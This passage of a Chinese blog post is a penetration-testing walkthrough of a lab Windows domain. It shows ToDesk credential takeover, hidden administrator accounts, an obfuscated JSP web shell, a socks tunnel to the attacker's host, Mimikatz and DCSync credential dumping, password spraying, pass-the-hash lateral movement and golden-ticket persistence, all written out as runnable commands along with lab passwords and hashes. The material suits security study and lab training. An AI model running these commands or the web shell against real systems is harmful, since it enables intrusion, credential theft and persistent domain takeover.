class="attr">tempAuthPassEx</span>=c132c740215bf6b2e5e5cec82aa1572b739398c7f142fe7335fb3769481b035df</span><br><span class="line">8af48bc411d97ae450f0540dd4eaf69131bce730b7e9803</span><br><span class="line"><span class="attr">PresetDialogUpdateDate</span>=<span class="number">2023</span>-<span class="number">10</span>-<span class="number">19</span></span><br><span class="line"><span class="attr">PresetDialogShowCount</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">UpdateFrequencyPromptBubble</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以轻易拿到设备代码为<code>clientId=211237490</code>，密码则需要我们把这些配置复制到我们本地的 ToDesk 配置文件中，我们再次启动本地的 ToDesk 时，本地的密码就是靶机的 ToDesk 密码，尝试连接：</p>
+<p><img src="/image/post/2023/10/19.png" alt="ToDesk 连接"></p>
+<p>关闭数字卫士，新建一个管理员用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hacker$ hacker###666 /add</span><br><span class="line">net localgroup Administrators hacker$ /add</span><br></pre></td></tr></table></figure>
+
+<p>作为权限维持的一个方式，RDP 连接上去：</p>
+<p><img src="/image/post/2023/10/20.png" alt="RDP 连接"></p>
+<p>可以再写一个 WebShell 作为权限维持的手段，如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把 shell 写到控制台 images 目录中</span></span><br><span class="line">\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</span><br><span class="line">http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写到 uddiexplorer 目录中</span></span><br><span class="line">\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp</span><br><span class="line">http://*.*.*.*:7001/uddiexplorer/shell.jsp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在应用安装目录中</span></span><br><span class="line">\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</span><br><span class="line">http://*.*.*.*:7001/项目名/shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>这里我选择的是第一种方式，下面是一个 Shell 的例子：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">&quot;utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">&quot;POST&quot;</span> NAME=<span class="string">&quot;form&quot;</span> ACTION=<span class="string">&quot;#&quot;</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">&quot;text&quot;</span> NAME=<span class="string">&quot;q&quot;</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">&quot;submit&quot;</span> VALUE=<span class="string">&quot;Fly&quot;</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=<span class="string">&quot;Got Nothing&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;q&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    <span class="keyword">if</span>(fileSeparator.equals(<span class="string">&quot;\\&quot;</span>))&#123;</span><br><span class="line">        isWin = <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        isWin = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (query != <span class="literal">null</span>) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        <span class="keyword">if</span>(isWin) &#123;</span><br><span class="line">            pb = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;), <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">47</span>, <span class="number">67</span>&#125;), query);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pb = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>&#125;), <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">45</span>, <span class="number">99</span>&#125;), query);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> pb.start();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(process.getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在实际中上面的代码也许需要修改，以满足隐蔽和加密的需求，接下来搭一个直通内网的代理，这里使用 EW 来搭建 Socks 隧道：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux 靶机上运行</span></span><br><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows 靶机上运行</span></span><br><span class="line">ew_for_Win -s rssocks -d 192.168.12.135 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p>在 Kali 添加以下 dns 解析，为下文做准备：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.10    dc.de1ay.com</span><br><span class="line">10.10.10.13    pc2.de1ay.com</span><br><span class="line">10.10.10.11    web.de1ay.com</span><br><span class="line">10.10.10.12    pc.de1ay.com</span><br></pre></td></tr></table></figure>
+
+<p>配置 Proxychains，编辑<code>vim /etc/proxychains4.conf</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">add proxy here ...</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">meanwile</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">defaults <span class="built_in">set</span> to <span class="string">&quot;tor&quot;</span></span></span><br><span class="line">socks5     127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p>接下来使用 Nmap 扫描内网：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap 10.10.10.1/24</span><br></pre></td></tr></table></figure>
+
+<p>可以扫描，不过速度慢的可怜，这里使用 Proxifier 在 Windows 上扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -Pn 10.10.10.10,11,12</span><br></pre></td></tr></table></figure>
+
+<p>使用 TCP 扫描，禁用 Ping：</p>
+<p><img src="/image/post/2023/10/21.png" alt="Nmap 扫描"></p>
+<p>但扫描速度还是比较慢，这里直接将扫描器扔到靶机里去扫描，这里使用 fscan：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 10.10.10.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/22.png" alt="fscan 扫描"></p>
+<p>这几个 MS17010 不准备去打，接下来上传 Mimikatz，使用下面的命令抓取明文密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; test.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到几个关键的密码：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DE1AY\mssql    1qaz@WSX</span><br><span class="line">WEB\de1ay    QWER!@#123</span><br></pre></td></tr></table></figure>
+
+<p>得到了一个域账户和一个本地账户和相应的密码</p>
+<h3 id="域内横移"><a href="#域内横移" class="headerlink" title="域内横移"></a>域内横移</h3><p>现在我们已经知道域内有三台机器，<code>10.10.10.10</code>是域控，我们拿下了 2008，还剩一台 Win7 和一台 2012 域控，既然有了有效的凭证，我们要使用这些凭证去横移，本应该去枚举域内的用户，这里有了有效的域账户，所以直接去查询，使用 PowerSploit 脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入脚本</span></span><br><span class="line">Import-Module .\Recon.psd1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置凭证</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">uname</span>=<span class="string">&quot;de1ay\mssql&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">pwd</span>=ConvertTo-SecureString <span class="string">&quot;1qaz@WSX&quot;</span> -AsPlainText –Force</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">cred=New-Object System.Management.Automation.PSCredential(<span class="variable">$uname</span>,<span class="variable">$pwd</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找域用户</span></span><br><span class="line">Get-DomainUser -Credential $cred | findstr samaccountname</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出 Domain Admins 组</span></span><br><span class="line">Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain de1ay.com -DomainController 10.10.10.10 -Credential $cred | findstr MemberName</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出 Administrators 组</span></span><br><span class="line">Get-DomainGroupMember -identity &quot;Administrators&quot; -Domain de1ay.com -DomainController 10.10.10.10 -Credential $cred | findstr MemberName</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">远程桌面管理组的成员</span></span><br><span class="line">Get-DomainGroupMember -identity &quot;Remote Desktop Users&quot; -Domain de1ay.com -DomainController 10.10.10.10 -Credential $cred | findstr MemberName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/23.png" alt="寻找域成员"></p>
+<p><img src="/image/post/2023/10/24.png" alt="寻找域成员"></p>
+<p>筛选出以下几个账户</p>
+<p><img src="/image/post/2023/10/25.png" alt="筛选的几个账户"></p>
+<p>尝试使用密码喷洒横移到这几个账户，这里使用 Kerbrute 来进行密码喷洒：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 10.10.10.10 -d de1ay.com .\User.txt 1qaz@WSX</span><br><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 10.10.10.10 -d de1ay.com .\User.txt QWER!@#123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/26.png" alt="密码喷洒"></p>
+<p>可以看到成功测试出来了很多的账户，其中包括域管理员用户<code>Administrator@de1ay.com:QWER!@#123</code>，我们可以尝试使用这个凭证借助之前搭建的 Socks 代理去连接域控和另一台 Win7：</p>
+<p><img src="/image/post/2023/10/27.png" alt="rdp 到域控"></p>
+<p>连接成功，同样做一下权限维持：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hacker$ hacker###666 /add</span><br><span class="line">net localgroup Administrators hacker$ /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/28.png" alt="权限维持"></p>
+<p>对于 Win7 我们也可以使用这个账号密码进行登录，上传 Mimikatz 抓一下凭证：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:de1ay.com /all /csv&quot; &quot;exit&quot; &gt; out.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/29.png" alt="dcsync"></p>
+<p>有时候不想登录 DC，也可以导出域内哈希，这里使用 impacket 下的脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains secretsdump.py de1ay/administrator:QWER\!@#123@10.10.10.10 -dc-ip 10.10.10.10 -just-dc-user krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/30.png" alt="dcsync"></p>
+<p>和上面的结果相同，接下来是 Win7，RDP 肯定可以访问，这里换一种方法，获取一个交互式的 Shell，使用 psexec：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains psexec.py administrator@10.10.10.12 -hashes :01c234eb550fca678d3cbf91628c9d2f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/31.png" alt="psexec"></p>
+<p>如果用户登录，数字卫士启动可能会导致失败，或者使用 wmiexec，不会上传文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wmiexec.py administrator@10.10.10.12 -hashes :01c234eb550fca678d3cbf91628c9d2f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/32.png" alt="wmi"></p>
+<p>可绕过数字卫士，用一样的方法，ToDesk 上线：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传 ToDesk</span></span><br><span class="line">lput /home/paoka/Temp/hongri/todesk/ToDesk_Setup.exe C:\Users\de1ay\Desktop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">静默安装</span></span><br><span class="line">start C:\Users\de1ay\Desktop\ToDesk_Setup.exe /S</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否成功</span></span><br><span class="line">dir &quot;C:\Program Files\ToDesk&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取密码文件</span></span><br><span class="line">type &quot;C:\Program Files\ToDesk\config.ini&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/33.png" alt="todesk"></p>
+<p>更换本地文件，连接！</p>
+<p><img src="/image/post/2023/10/34.png" alt="连接！"></p>
+<p>关掉数字卫士，做权限维持：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hacker$ hacker###666 /add</span><br><span class="line">net localgroup Administrators hacker$ /add</span><br></pre></td></tr></table></figure>
+
+<p>上传 Mimikatz，读取凭证：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot; &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/35.png" alt="读取凭证"></p>
+<p>到此，三台靶机全部拿下！</p>
+<h3 id="域内权限维持"><a href="#域内权限维持" class="headerlink" title="域内权限维持"></a>域内权限维持</h3><p>拿到域后，可以在域内做权限维持，首先来制作黄金票据（白银票据类似）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">制作黄金票据</span></span><br><span class="line">ticketer.py -nthash 82dfc71b72a11ef37d663047bc2088fb -domain-sid S-1-5-21-2756371121-2868759905-3853650604 -domain de1ay.com administrator</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用黄金票据</span></span><br><span class="line">proxychains wmiexec.py de1ay.com/administrator@web -k -no-pass</span><br><span class="line">proxychains wmiexec.py de1ay.com/administrator@pc -k -no-pass</span><br><span class="line">proxychains wmiexec.py de1ay.com/administrator@dc -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/36.png" alt="黄金票据"></p>
+<p>这样就做好了黄金票据，接下来可以尝试打造变种的黄金票据，以下为简介：</p>
+<blockquote>
+<p>当拿到域控后，需要做权限维持，假设服务 B 为 krbtgt，服务 A 为我们控制的一个账号。配置服务 A 到服务 B 的基于资源的约束性委派， 那么我们控制的账户就可以获取 KDC（Key Distribution Centre）服务的 ST 服务票据（也就是 TGT 认购权证）。于是我们就可以伪造任何权限用户的 TGT 认购权证，就相当于打造了一个变种的黄金票据</p>
+</blockquote>
+<p>详细可参考：<a target="_blank" rel="noopener" href="https://blog.zjun.info/tech/kerberos-domain-delegation-attack/#%E5%88%A9%E7%94%A8%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%89%93%E9%80%A0%E5%8F%98%E7%A7%8D%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE">利用基于资源的约束性委派打造变种黄金票据</a>，这是基于资源的约束性委派，还有约束性委派的例子：<a target="_blank" rel="noopener" href="https://paper.seebug.org/620/">利用 Kerberos delegation 打造变种黄金票据</a>，利用 <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a> 脚本新建一个密码为 gttest 的机器账号，密码为 123456：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount gttest -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
+
+<p>再配置 gttest 到 krbtgt 的基于资源的约束性委派（需要域管权限）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置</span></span><br><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount gttest$</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询</span></span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<p>配置完成后，不管域管用户密码如何改变，我们都对该域有完全的控制权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains getST.py -dc-ip 10.10.10.10 -spn krbtgt -impersonate administrator de1ay.com/gttest\$:123456</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span> KRB5CCNAME=administrator.ccache</span></span><br><span class="line">proxychains smbexec.py -no-pass -k administrator@dc.de1ay.com -dc-ip 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/37.png" alt="变种黄金票据"></p>
+<p>如上图，可以在域控执行命令，这种方法相对于传统的黄金票据动作稍微有点大</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CobaltStrike/" rel="tag"># CobaltStrike</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/09/23/Kerberos-%E8%AE%A4%E8%AF%81/" rel="prev" title="Kerberos 认证">
+                  <i class="fa fa-angle-left"></i> Kerberos 认证
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/11/05/Python-asyncio/" rel="next" title="Python asyncio">
+                  Python asyncio <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备2022001516号 </a>
+  </div>
+  <div class="copyright">
+    &copy; 2022 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Paoka1</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
